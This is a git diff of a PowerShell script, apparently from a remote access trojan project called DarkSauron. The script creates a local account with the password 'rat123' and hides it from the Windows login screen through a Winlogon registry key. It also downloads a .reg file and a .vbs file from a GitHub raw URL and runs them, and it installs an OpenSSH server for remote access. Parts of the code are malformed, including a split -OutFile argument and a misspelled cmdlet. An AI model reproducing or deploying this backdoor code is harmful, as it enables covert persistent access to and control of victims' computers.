@@ -37,14 +37,24 @@ $pword = (ConvertTo-Securestring "rat123"-AsPlainText -Force)
 create_account  -uname $uname -pword $pword
 
 #registry  to hide local admin
-$registry_name = random_text
-(
-    echo Windows Registry Editior Version 5.00
+$reg_file = random_text
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/admin.reg -OutFile
+"$reg_file.reg"
 
-    echo
-    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList]
-    echo "DarkSauron"=dword:00000000;
-) > "$registry_name.reg"
+
+
+
+#visual basic script to registry
+$vbs_file = random_text
+Invoke-WebRequest  -Uri https://raw.githubusercontent.com/knightcoder77/DarkSauron/main/files/confirm.vbs -OutFile
+"$vbs_file.vbs".ps1
+
+#install the registry
+./"$reg_file.reg";"$vbs_file.vbs"
+
+
+
+
 
 
 #varaibles
@@ -52,7 +62,7 @@ $registry_name = random_text
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
- // watch the video from the timeline 34:00 
+ 
 
 
 
@@ -77,8 +87,5 @@ Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Nam
  #del installer.ps1
 
 
-
-
-
-i am happy  to do the same thing again and agian
+ 
 
